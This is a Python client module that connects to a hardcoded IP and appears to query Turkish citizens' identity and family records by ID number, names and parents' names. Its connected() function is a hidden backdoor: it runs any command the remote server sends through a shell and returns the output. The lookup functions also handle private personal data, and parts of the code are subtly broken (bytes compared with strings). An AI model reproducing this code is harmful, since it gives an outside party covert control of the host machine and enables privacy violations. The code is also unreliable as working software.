import socket
import json
import subprocess
import time

# Global client socket
client_socket = None

def create_client_socket():
    global client_socket
    if client_socket is None:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('87.248.157.112', 65432))  # Set server IP and port

def close_client_socket():
    global client_socket
    if client_socket:
        client_socket.close()
        client_socket = None

def connected():
    create_client_socket()
    request_data = "Ready"
    client_socket.send(request_data.encode())
    
    response = client_socket.recv(1024).decode()
    response_data = json.loads(response)

    if "command" in response_data:
        command = response_data["command"]
        if command:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            # Combine stdout and stderr
            output = stdout + stderr

            # Send data in chunks
            chunk_size = 1024
            for i in range(0, len(output), chunk_size):
                client_socket.send(output[i:i + chunk_size])
            client_socket.send("".encode())
            time.sleep(1)
            client_socket.send("Bitti".encode())
            return "Capito"

def send_request(command, *args):
    buffer = []
    create_client_socket()
    request_data = f"{command}|" + "|".join(args)
    client_socket.send(request_data.encode())
    while True:
        data = client_socket.recv(1024)
        if data == "Bitti":
            break
        buffer.append(data)
    output = ''.join(buffer)
    
    try:
        return json.loads(output.decode('utf-8'))
    except json.JSONDecodeError:
        return {"error": "Lütfen Daha Fazla Bilgi Verin"}

def tumaile(tc, token):
    return send_request("tumaile", tc, token)

def aile(tc, token):
    return send_request("aile", tc, token)

def kisi(ad, soyad, annead, babaad, il, ilce, token):
    return send_request("kisi", ad, soyad, annead, babaad, il, ilce, token)
#New
